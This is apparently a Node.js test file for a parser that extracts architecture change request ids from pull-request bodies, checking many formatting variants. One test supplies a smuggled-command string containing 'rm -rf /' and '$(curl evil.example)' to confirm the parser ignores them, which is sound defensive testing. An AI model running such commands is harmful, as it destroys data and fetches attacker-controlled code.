import assert from "node:assert/strict";
import { test } from "node:test";

import { parseAcrRouting } from "../src/parse-acr-routing.js";

test("parse-acr-routing: the documented bare line", () => {
  assert.deepEqual(parseAcrRouting("ACR-Routing: ACR-003\n"), ["ACR-003"]);
});

test("parse-acr-routing: comma-separated list on the bare line", () => {
  assert.deepEqual(parseAcrRouting("ACR-Routing: ACR-003, ACR-004\n"), ["ACR-003", "ACR-004"]);
});

test("parse-acr-routing: the PR-template list-item form", () => {
  const body = ["## Architecture", "", "  - ACR-Routing: ACR-003", "  - ACR record: governance/acr/ACR-003.json", ""].join("\n");
  assert.deepEqual(parseAcrRouting(body), ["ACR-003"]);
});

test("parse-acr-routing: the bold list-item form the ARCH-WF-002 PR body uses", () => {
  const body = ["- **This PR routes its changes through an ACR:**", "  - **ACR-Routing: ACR-003**", ""].join("\n");
  assert.deepEqual(parseAcrRouting(body), ["ACR-003"]);
});

test("parse-acr-routing: the bold non-list form", () => {
  assert.deepEqual(parseAcrRouting("**ACR-Routing: ACR-003**\n"), ["ACR-003"]);
});

test("parse-acr-routing: case-insensitive label", () => {
  assert.deepEqual(parseAcrRouting("acr-routing: ACR-007\n"), ["ACR-007"]);
});

test("parse-acr-routing: star bullets also accepted", () => {
  assert.deepEqual(parseAcrRouting("* ACR-Routing: ACR-003\n"), ["ACR-003"]);
});

test("parse-acr-routing: no routing line yields nothing", () => {
  assert.deepEqual(parseAcrRouting("Just an ordinary PR body.\n- No citation here\n"), []);
});

test("parse-acr-routing: an unfilled template comment never leaks its example ids (fail-closed)", () => {
  const template = [
    "- If this PR must change an architecture-controlled artifact, it is routed through an Architecture Change Request instead of a silent change:",
    "  - ACR-Routing: <!-- e.g. ACR-Routing: ACR-003 — the single line the governance CI reads; the cited ACR must be APPROVED or IMPLEMENTED and must enumerate the exact changed paths in its authorized_paths -->",
    "  - ACR record: governance/acr/ACR-<!-- NNN -->.json",
    "",
  ].join("\n");
  assert.deepEqual(parseAcrRouting(template), []);
});

test("parse-acr-routing: a citation followed by a retained HTML comment keeps only the citation", () => {
  const body = "  - ACR-Routing: ACR-003 <!-- note: routed per the architect's proposal -->\n";
  assert.deepEqual(parseAcrRouting(body), ["ACR-003"]);
});

test("parse-acr-routing: prose before the label never matches", () => {
  assert.deepEqual(parseAcrRouting("See the line below; ACR-Routing: ACR-003 is the channel.\n"), []);
});

test("parse-acr-routing: trailing prose after the ids is ignored, ids are extracted exactly", () => {
  assert.deepEqual(parseAcrRouting("ACR-Routing: ACR-003 — routed per the architect's 3dbe166 proposal\n"), ["ACR-003"]);
});

test("parse-acr-routing: injection payloads never leave the constrained token pattern", () => {
  const body = 'ACR-Routing: ACR-003; rm -rf /; $(curl evil.example) `whoami`\n';
  assert.deepEqual(parseAcrRouting(body), ["ACR-003"]);
});

test("parse-acr-routing: the LAST routing line wins (single-line semantics)", () => {
  const body = ["ACR-Routing: ACR-003", "", "ACR-Routing: ACR-004", ""].join("\n");
  assert.deepEqual(parseAcrRouting(body), ["ACR-004"]);
});

test("parse-acr-routing: CRLF bodies parse identically", () => {
  const body = "## Architecture\r\n\r\n  - **ACR-Routing: ACR-003**\r\n";
  assert.deepEqual(parseAcrRouting(body), ["ACR-003"]);
});

test("parse-acr-routing: demo 9xx ids are extracted too (the refusal layer rejects them)", () => {
  assert.deepEqual(parseAcrRouting("ACR-Routing: ACR-901\n"), ["ACR-901"]);
});

test("parse-acr-routing: malformed ids are not extracted", () => {
  assert.deepEqual(parseAcrRouting("ACR-Routing: ACR-3\n"), []);
  assert.deepEqual(parseAcrRouting("ACR-Routing: ACR-0003\n"), []);
});
